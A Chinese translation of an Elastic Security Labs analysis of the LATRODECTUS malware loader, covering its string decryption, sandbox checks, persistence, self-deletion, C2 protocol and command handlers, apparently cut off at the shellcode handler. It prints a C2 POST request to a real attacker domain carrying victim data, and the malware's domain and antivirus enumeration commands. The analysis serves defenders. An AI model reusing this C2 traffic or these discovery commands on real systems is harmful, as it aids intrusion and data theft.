@@ -1,0 +1,1025 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>翻译：<a href="https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus" target="_blank">https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus</a></p>
+<h1 data-content="1" id="75b496b4a257849fccaeff8b8438c54c">LATRODECTUS 介绍</h1>
+<hr/>
+<p>2023年10月，沃尔玛研究人员首次发现了LATRODECTUS，这是一种恶意软件加载器，在网络犯罪分子中越来越受欢迎。尽管被认为是一个新的家族，但由于行为和发展上的相似之处，包括一个下载和执行加密负载的命令处理程序，LATRODECTUS与ICEDID之间存在着紧密联系。Proofpoint 和 Team Cymru 基于这一点，发现了 ICEDID 和 LATRODECTUS 的运营者在网络基础设施之间存在着密切的联系。</p>
+<p>LATRODECTUS提供了广泛的标准功能，威胁行为者可以利用这些功能部署进一步的有效负载，在初步攻破后进行各种活动。其代码库没有被混淆，只有11个命令处理程序，主要集中在枚举和执行方面。这种类型的加载程序代表了我们团队最近观察到的一波趋势，如PIKABOT，其代码更加轻量和直接，具有有限数量的处理程序。</p>
+<p>这篇文章将重点关注LATRODECTUS本身,分析其最显著的特征,并提供应对这一具有财务冲击的威胁资源。</p>
+<h2 data-content="1" id="f5600ebb31702a0ff4b5e20fe6ca69c9">关键要点</h2>
+<ul>
+<li>LATRODECTUS是沃尔玛研究人员去年最初发现的，目前在最近的以财务为动机的活动中继续获得认可</li>
+<li>LATRODECTUS，一个可能取代 ICEDID 的替代品，与 ICEDID 相似，包括一个命令处理程序来执行 ICEDID 的有效负载</li>
+<li>自从其创立以来，我们观察到了新的事件处理程序（进程发现、桌面文件列表），并集成了一种自删除技术来删除运行文件</li>
+<li>Elastic Security 通过内存签名、行为规则和威胁狩猎提供超高能力，以应对像 LATRODECTUS 这样的威胁（Elastic Security团队的私货，可以理解）</li>
+</ul>
+<h2 data-content="1" id="1e021604108ec88e8d12559869fb033b">LATRODECTUS 活动概述</h2>
+<p>从2024年3月初开始，Elastic Security实验室观察到通过电子邮件传播LATRODECTUS的活动有所增加。这些活动通常涉及一个可识别的感染链，其中包含超大的JavaScript文件，利用WMI的功能调用msiexec.exe并安装远程托管在WEBDAV共享上的MSI文件。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520211847-7da1fd6c-16ab-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图1：攻击链</td>
+</tr>
+</tbody>
+</table>
+<p>在过去一年中，加载器领域发生了重大变化，例如 QBOT 被摧毁和 ICEDID 消失，我们看到新的加载器，如 PIKABOT 和 LATRODECTUS 已经出现，可能成为替代品。</p>
+<h1 data-content="1" id="3a84f954644becad8e501b06df70bf3d">LATRODECTUS 分析</h1>
+<hr/>
+<p>我们的 LATRODECTUS <a href="https://www.virustotal.com/gui/file/aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c/details" target="_blank">样本</a>最初打包了伪装成 Bitdefender 内核模式驱动程序（TRUFOS.SYS）组件的文件信息，如下图所示。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520212325-235ad648-16ac-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图2：打包的 LATRODECTUS 样本文件版本信息</td>
+</tr>
+</tbody>
+</table>
+<p>为了继续进行恶意软件分析，样本必须通过手动解包或通过自动解包服务,如 <a href="https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus" target="_blank">UnpacMe</a>进行解包。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520212805-ca3ee0da-16ac-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图3：UnpacMe 摘要</td>
+</tr>
+</tbody>
+</table>
+<p>LATRODECTUS 是一个具有 4 个不同导出函数的 DLL，每个导出函数都被分配相同的导出地址。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520212913-f28e3676-16ac-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图4：LATRODECTUS 的出口</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="659d8754558b634d82ed8f9192ffa255">字符串混淆</h2>
+<p>LATRODECTUS 中的所有字符串都受到保护，使用简单算法对加密字节进行处理，并通过执行算术和位操作进行转换。2023 年发表的<a href="https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39" target="_blank">初始报告</a>详细介绍了一个在我们的样本中未观察到的 PRNG 算法，表明这个加载器的持续发展。以下是在 Python 中使用我们的 <a href="https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus" target="_blank">nightMARE 框架</a>实现的算法：</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">decrypt_string</span><span class="p">(</span><span class="n">encrypted_bytes</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">cast</span><span class="o">.</span><span class="n">u32</span><span class="p">(</span><span class="n">encrypted_bytes</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
+    <span class="n">y</span> <span class="o">=</span> <span class="n">cast</span><span class="o">.</span><span class="n">u16</span><span class="p">(</span><span class="n">encrypted_bytes</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])</span>
+    <span class="n">byte_size</span> <span class="o">=</span> <span class="n">cast</span><span class="o">.</span><span class="n">u16</span><span class="p">(</span><span class="n">cast</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span><span class="p">)[:</span><span class="mi">2</span><span class="p">])</span>
+    <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">byte_size</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">encrypted_bytes</span><span class="p">[</span><span class="mi">6</span> <span class="p">:</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">byte_size</span><span class="p">]):</span>
+        <span class="n">decoded_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decoded_bytes</span><span class="p">)</span>
+</pre></div>
+<h2 data-content="1" id="9615be71866c340540da5885cc59a927">运行时 API</h2>
+<p>LATRODECTUS 在运行时模糊了大部分的导入。程序开始时，它查询 PEB 并结合使用 CRC32 校验和来解析 kernel32.dll 和 ntdll.dll 模块及其函数。为了解析额外的库，如 user32.dll 或 wininet.dll ，恶意软件采取了不同的方法，执行通配符搜索（ *.dll ）在 Windows 系统目录中。它检索每个 DLL 文件名并将它们直接传递给 CRC32 校验和函数。<br/>
+LATRODECTUS在运行时模糊了大部分的导入。程序开始时，它通过查询PEB并结合使用CRC32校验和来解析kernel32.dll和ntdll.dll模块及其函数。为了解析额外的库文件，如user32.dll或wininet.dll，恶意软件采用不同的方法，在Windows系统目录中执行通配符搜索（*.dll）。它检索每个DLL文件名，并直接传递给一个CRC32校验和函数。<br/>
+LATRODECTUS在运行时之前对大部分的导入进行了混淆。在程序启动时，它查询PEB（进程环境块），结合使用CRC32校验和来解析<code>kernel32.dll</code>和<code>ntdll.dll</code>模块及其功能。为了解析其他库，例如<code>user32.dll</code>或<code>wininet.dll</code>，该恶意软件采用了不同的方法，在Windows系统目录中执行通配符搜索<code>（*.dll）</code>。它检索每个DLL文件名并直接将它们传递给CRC32校验和函数。 （译注：这种动态解析和混淆技术使LATRODECTUS更加隐蔽，难以被检测和分析，有效地提高了其对抗安全防护措施的能力。)</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520214541-3f60f720-16af-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图5：使用 CRC32 校验和进行 DLL 搜索</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="f273d02289512c335e63d5e26d48d84d">分析对抗</h2>
+<p>当所有的导入都被解析后，LATRODECTUS会执行一系列的反分析检查。首先，通过检查进程环境块（PEB）中的BeingDebugged标志来监控是否存在调试器。如果发现调试器，程序将终止</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520215037-f012dad4-16af-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">通过 PEB 检查是否正在调试</td>
+</tr>
+</tbody>
+</table>
+<p>为了避免检测到活跃进程数量较少的沙箱或虚拟机，LATRODECTUS使用了两个验证检查，将运行的进程数量与操作系统产品版本结合起来进行验证。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520215417-731c4000-16b0-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图6：进程数量和操作系统验证检查</td>
+</tr>
+</tbody>
+</table>
+<p>为了考虑不同Windows操作系统版本之间的主要差异,开发人员使用了一个基于Windows主版本/次版本号和内部版本号的自定义枚举类型。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520215630-c2a426b0-16b0-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图7：与内部版本号、操作系统版本相关的枚举</td>
+</tr>
+</tbody>
+</table>
+<p>这两个先前的条件翻译为：</p>
+<ul>
+<li>如果进程数量少于 75 且操作系统版本是最新版本，如 Windows 10、Windows Server 2016 或 Windows 11，则 LATRODECTUS 将退出</li>
+<li>如果进程数量少于 50 且操作系统版本为较旧版本（如 Windows Server 2003 R2、Windows XP、Windows 2000、Windows 7、Windows 8 或 Windows Server 2012/R2），LATRODECTUS 将退出</li>
+</ul>
+<p>经过沙箱检查后，LATRODECTUS 验证当前进程是否在 WOW64 下运行，WOW64 是 Windows 操作系统的一个子系统，允许 32 位应用程序在 64 位系统上运行。如果是真的（在 64 位操作系统上作为 32 位应用程序运行），恶意软件将退出。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520220149-80a4f374-16b1-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图8：IsWow64Process 检查</td>
+</tr>
+</tbody>
+</table>
+<p>最后一次检查是基于通过 <code>iphlpapi.dll</code> 的 <code>GetAdaptersInfo()</code>调用验证 MAC 地址。如果没有有效的 MAC 地址，恶意软件也将终止。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520220402-d0178732-16b1-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图9：MAC 地址检查</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="8c4ec7b3be95b9703806bf4f6ad545e7">互斥锁</h2>
+<p>该恶意软件使用字符串 runnung 作为互斥体，以防止在主机上重新感染，这可能是开发人员的意外打字错误。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520220615-1ee9fb92-16b2-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图10：互斥锁</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="ab2acfcb9656c59ca9b5577c461e634c">硬件 ID</h2>
+<p>互斥体创建后，LATRODECTUS 将生成一个硬件 ID，该 ID 是由机器的卷序列号与一个硬编码常数（<code>0x19660D</code>）相乘得到的。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520221157-eb21c438-16b2-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图11：硬件 id 计算</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="dc319dcb8767739fea79823890a8c435">活动 ID</h2>
+<p>在这个阶段，我们从样本中解密的活动名称（<code>Littlehw</code> ）被用作种子传递到 Fowler-Noll-Vo 哈希函数中。这将产生一个哈希值，用于演员跟踪不同的活动和相关的受害者机器。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520221809-c8c2d336-16b3-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图12：使用 FNV 计算活动 ID</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="1d1a790744fc954db623808eeceac8e4">设置/持久化</h2>
+<p>恶意软件将使用配置参数生成文件夹路径，这些参数确定了 LATRODECTUS 将被放置在磁盘上的位置，例如以下目录：</p>
+<ul>
+<li>AppData</li>
+<li>Desktop</li>
+<li>Startup</li>
+<li>Personal</li>
+<li>Local\AppData<br/>
+我们的样本配置为使用硬编码目录字符串 <code>AppData</code> 的 <code>Custom_update</code>位置，以及与从卷序列号种子化的数字连接的硬编码文件名<code>Update_</code>。 以下是我们虚拟机中的完整文件路径：</li>
+</ul>
+<div class="highlight"><pre><span></span>C:<span class="se">\U</span>sers<span class="se">\R</span>EM<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\C</span>ustom_update<span class="se">\U</span>pdate_88d58563.dll
+</pre></div>
+<p>恶意软件将检查是否存在文件 <code>AppData\Roaming\Custom_update\update_data.dat</code> 以供读取，如果文件不存在，它将在写入自身副本之前创建目录。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520222449-b770cc40-16b4-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 13：LATRODECTUS 写在 AppData 中</td>
+</tr>
+</tbody>
+</table>
+<p>文件复制完成后，LATRODECTUS 从全局配置中检索两个 C2 域，使用先前描述的字符串解密函数。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520222551-dc31e2d0-16b4-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 14：解密 C2 服务器</td>
+</tr>
+</tbody>
+</table>
+<p>在主线程执行命令分派之前，LATRODECTUS 使用 Windows 组件对象模型（COM）设置了一个持久性的定时任务。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520222658-04221102-16b5-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 15：通过 COM 创建定时任务</td>
+</tr>
+</tbody>
+</table>
+<p>在我们的示例中，任务名称被硬编码为 <code>Updater</code> ，并计划在成功登录后执行。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520222744-1f378be8-16b5-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 16：计划任务属性</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="034a4612c76d6714d12e514d23e60ec6">自删除</h2>
+<p>自删除是 LATRODECTUS 采用的一个值得注意的技术之一。它是由 Jonas Lykkegaard <a href="https://x.com/jonasLyk/status/1350401461985955840" target="_blank">发现</a>并由 Lloyd Davies 在 delete-self-poc repo 中<a href="https://github.com/LloydLabs/delete-self-poc" target="_blank">实现</a>的。该技术允许 LATRODECTUS 在进程仍在运行时使用备用数据流删除自身。</p>
+<p>Elastic Security实验室已经看到这种技术被用于 ROOK 勒索软件家族等恶意软件中。可能的目标是通过干扰收集和分析来阻碍事件响应过程。编译的恶意软件包含存储库中的一个字符串（<code>:wtfbbq</code>）。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520223105-97679d4c-16b5-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 17：LATRODECTUS 中的自删除代码</td>
+</tr>
+</tbody>
+</table>
+<p>这种技术在感染开始时以及恶意软件使用事件处理程序＃15 执行更新时被观察到。Elastic Security Labs 已创建了一个<a href="https://github.com/mandiant/capa-rules/blob/master/anti-analysis/anti-forensic/self-deletion/self-delete-using-alternate-data-streams.yml" target="_blank">CAPA 规则</a>，以帮助其他组织在分析各种恶意软件时通用地识别这种行为。</p>
+<h2 data-content="1" id="6e2edc35556d1bf23c6c4848f39a6757">通讯</h2>
+<p>LATRODECTUS 使用 base64 和 RC4 加密其请求，使用硬编码密码 <code>12345</code> 。第一个包含受害者信息和配置细节的 HTTPS POST 请求，注册受感染的系统。</p>
+<div class="highlight"><pre><span></span>POST https://aytobusesre.com/live/ HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 <span class="o">(</span>compatible<span class="p">;</span> MSIE <span class="m">7</span>.0<span class="p">;</span> Windows NT <span class="m">5</span>.1<span class="p">;</span> Tob <span class="m">1</span>.1<span class="o">)</span>
+Host: aytobusesre.com
+Content-Length: <span class="m">256</span>
+Cache-Control: no-cache
+
+M1pNDFh7flKrBaDJqAPvJ98BTFDZdSDWDD8o3bMJbpmu0qdYv0FCZ0u6GtKSN0g//WHAS2npR/HDoLtIKBgkLwyrIh/3EJ+UR/0EKhYUzgm9K4DotfExUiX9FBy/HeV7C4PgPDigm55zCU7O9kSADMtviAodjuRBVW3DJ2Pf5+pGH9SG1VI8bdmZg+6GQFpcFTGjdWVcrORkxBjCGq3Eiv2svt3+ZFIN126PcvN95YJ0ie1Puljfs3wqsW455V7O
+</pre></div>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520223643-607d6522-16b6-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 18：初始注册请求</td>
+</tr>
+</tbody>
+</table>
+<p>以下是第一个请求中发送的解密内容示例：</p>
+<div class="highlight"><pre><span></span><span class="nv">counter</span><span class="o">=</span><span class="m">0</span><span class="p">&amp;</span><span class="nv">type</span><span class="o">=</span><span class="m">1</span><span class="p">&amp;</span><span class="nv">guid</span><span class="o">=</span>249507485CA29F24F77B0F43D7BA<span class="p">&amp;</span><span class="nv">os</span><span class="o">=</span><span class="m">6</span><span class="p">&amp;</span><span class="nv">arch</span><span class="o">=</span><span class="m">1</span><span class="p">&amp;</span><span class="nv">username</span><span class="o">=</span>user<span class="p">&amp;</span><span class="nv">group</span><span class="o">=</span><span class="m">510584660</span><span class="p">&amp;</span><span class="nv">ver</span><span class="o">=</span><span class="m">1</span>.1<span class="p">&amp;</span><span class="nv">up</span><span class="o">=</span><span class="m">4</span><span class="p">&amp;</span><span class="nv">direction</span><span class="o">=</span>aytobusesre.com<span class="p">&amp;</span><span class="nv">mac</span><span class="o">=</span><span class="m">00</span>:0c:24:0e:29:85<span class="p">;&amp;</span><span class="nv">computername</span><span class="o">=</span>DESKTOP-3C4ILHO<span class="p">&amp;</span><span class="nv">domain</span><span class="o">=</span>-
+</pre></div>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>counter</td>
+<td>每次回调时，C2 请求的数量增加一</td>
+</tr>
+<tr>
+<td>type</td>
+<td>请求类型（注册，等等）</td>
+</tr>
+<tr>
+<td>guid</td>
+<td>由卷序列号生成的硬件 ID 种子</td>
+</tr>
+<tr>
+<td>os</td>
+<td>Windows 操作系统产品版本</td>
+</tr>
+<tr>
+<td>arch</td>
+<td>Windows 架构版本</td>
+</tr>
+<tr>
+<td>username</td>
+<td>感染机器的用户名</td>
+</tr>
+<tr>
+<td>group</td>
+<td>由唯一字符串在二进制中种子化的活动标识符与 FNV</td>
+</tr>
+<tr>
+<td>version</td>
+<td>LATRODECTUS 版本</td>
+</tr>
+<tr>
+<td>up</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>direction</td>
+<td>C2 域</td>
+</tr>
+<tr>
+<td>mac</td>
+<td>MAC 地址</td>
+</tr>
+<tr>
+<td>computername</td>
+<td>受感染机器的主机名</td>
+</tr>
+<tr>
+<td>domain</td>
+<td>感染机器的域</td>
+</tr>
+</tbody>
+</table>
+<p>每个请求由对象类型、整数值和相应参数以管道分隔。有 4 种对象类型，可以路由攻击者控制的命令（CLEARURL、URLS、COMMAND、ERROR）。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520223931-c4a7a06c-16b6-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 19：命令调度逻辑</td>
+</tr>
+</tbody>
+</table>
+<p>主要事件处理程序通过 COMMAND 对象类型传递，其中包括处理程序 ID 和它们各自的参数。</p>
+<div class="highlight"><pre><span></span>COMMAND<span class="p">|</span><span class="m">12</span><span class="p">|</span>http://www.xxxxxx.com/test  <span class="o">(</span>译注：有改动，原网站有问题<span class="o">)</span>
+</pre></div>
+<p>CLEARURL 对象类型用于删除任何配置的域。URLS 对象类型允许攻击者切换到新的 C2 URL。最后一个对象类型 ERROR 目前未配置。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520224029-e7a51838-16b6-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 20：通过 CyberChef 的命令请求示例</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="0e69522da96e6d993a39f5444e730310">bot功能</h2>
+<p>LATRODECTUS 的核心功能是通过其命令处理程序驱动的。这些处理程序用于从受害机器收集信息，提供执行能力以及配置植入物。自最初发布以来，我们已经看到添加了两个附加处理程序（检索进程、桌面列表），这可能表明代码库仍然活跃并在变化。</p>
+<table>
+<thead>
+<tr>
+<th>命令 ID</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>从桌面目录检索文件列表</td>
+</tr>
+<tr>
+<td>3</td>
+<td>检索进程祖先</td>
+</tr>
+<tr>
+<td>4</td>
+<td>收集系统信息</td>
+</tr>
+<tr>
+<td>12</td>
+<td>下载并执行 PE</td>
+</tr>
+<tr>
+<td>13</td>
+<td>下载并执行 DLL</td>
+</tr>
+<tr>
+<td>14</td>
+<td>下载并执行 shellcode</td>
+</tr>
+<tr>
+<td>15</td>
+<td>执行更新，重新启动</td>
+</tr>
+<tr>
+<td>17</td>
+<td>终止自身进程和线程</td>
+</tr>
+<tr>
+<td>18</td>
+<td>下载并执行 ICEDID 负载</td>
+</tr>
+<tr>
+<td>19</td>
+<td>增加信标超时时间</td>
+</tr>
+<tr>
+<td>20</td>
+<td>重置请求计数器</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="2244985ae6f84f6838aaa3210076e78b">桌面列表 - 命令 ID（2）</h3>
+<p>此命令处理程序将检索用户桌面内容列表，开发人员称之为 <code>desklinks</code> 。这些数据将被加密并附加到出站信标请求中。这用于快速枚举和验证受害者环境。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520224703-d28f6466-16b7-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 21：桌面列表（处理程序＃2）</td>
+</tr>
+</tbody>
+</table>
+<p>示例请求:</p>
+<pre><code>counter=0&amp;type=1&amp;guid=249507485CA29F24F77B0F43D7BA&amp;os=6&amp;arch=1&amp;username=user&amp;group=510584660&amp;ver=1.1&amp;up=4&amp;direction=aytobusesre.com&amp;desklinks=["OneDrive.lnk","OneNote.lnk","PowerPoint.lnk","Notepad++.lnk","Excel.lnk","Google Chrome.lnk","Snipping Tool.lnk","Notepad.lnk","Paint.lnk"]</code></pre>
+<h3 data-content="1" id="76e1d193e6646b6d022c69638bdc3d31">处理祖先 - 命令 ID（3）</h3>
+<p>此事件处理程序由开发人员引用为 proclist，它通过 <code>CreateToolhelp32Snapshot</code> API 从受感染的计算机收集整个运行进程的祖先。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520225027-4bade976-16b8-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 22：检索进程祖先（处理程序＃3）</td>
+</tr>
+</tbody>
+</table>
+<p>像安全研究人员一样，恶意软件作者对进程的父子关系也感兴趣，以便做出决策。LATRODECTUS 的作者甚至收集有关进程的孙子信息，可能是为了验证不同的受损环境。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520225158-826868d8-16b8-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 23：LATRODECTUS收集进程祖先的示例</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="f3ef0139a183ce9d02533d67a291cc61">收集系统信息 - 命令 ID（4）</h3>
+<p>此命令处理程序创建一个新线程，运行以下系统发现/枚举命令，每个命令都是一个潜在的检测机会：</p>
+<div class="highlight"><pre><span></span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c ipconfig /all
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c systeminfo
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c nltest /domain_trusts
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c nltest /domain_trusts /all_trusts
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c net view /all /domain
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c net view /all
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c net group <span class="s2">"Domain Admins"</span> /domain
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\w</span>bem<span class="se">\w</span>mic.exe /Node:localhost /Namespace:<span class="se">\\</span>root<span class="se">\S</span>ecurityCenter2 Path AntiVirusProduct Get * /Format:List
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c net config workstation
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c wmic.exe /node:localhost /namespace:<span class="se">\\</span>root<span class="se">\S</span>ecurityCenter2 path AntiVirusProduct Get DisplayName <span class="p">|</span> findstr /V /B /C:displayName <span class="o">||</span> <span class="nb">echo</span> No Antivirus installed
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe /c whoami /groups
+</pre></div>
+<p>每个输出都与相应的收集数据放置在 URI 中：</p>
+<div class="highlight"><pre><span></span><span class="p">&amp;</span><span class="nv">ipconfig</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">systeminfo</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">domain_trusts</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">domain_trusts_all</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">net_view_all_domain</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">net_view_all</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">net_group</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">wmic</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">net_config_ws</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">net_wmic_av</span><span class="o">=</span>
+<span class="p">&amp;</span><span class="nv">whoami_group</span><span class="o">=</span>
+</pre></div>
+<h3 data-content="1" id="8e5472f1dda87ce27f0d9e20f2b3a472">下载并执行 PE - 命令 ID（12）</h3>
+<p>此处理程序从 C2 服务器下载一个 PE 文件，然后将内容写入磁盘，并使用随机生成的文件名执行该文件。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520225422-d7fe4d8a-16b8-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图24：下载并运行 PE 功能（处理程序＃4）</td>
+</tr>
+</tbody>
+</table>
+<p>以下是在我们的环境中使用此处理程序的示例：</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520225456-ec6e538c-16b8-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 25：下载和运行 PE 功能的进程树</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="053a9023ba75227fbf478024f0c415c3">下载并执行 DLL - 命令 ID（13）</h3>
+<p>此命令处理程序从 C2 服务器下载一个 DLL 文件，将其写入磁盘并使用随机生成的文件名执行该 DLL 文件，然后使用 rundll32.exe 运行。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520225546-09c17036-16b9-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 26：下载并运行 DLL 函数（处理程序＃13）</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="0bba948ab74a7297b11bda12f97ef0c4">下载并执行 shellcode - 命令（14）</h3>
+<p>此命令处理程序通过 <code>InternetReadFile</code> 从 C2 服务器下载 shellcode，然后将 shellcode 分配并复制到内存中，然后使用指向 shellcode 的新线程直接调用它。</p>
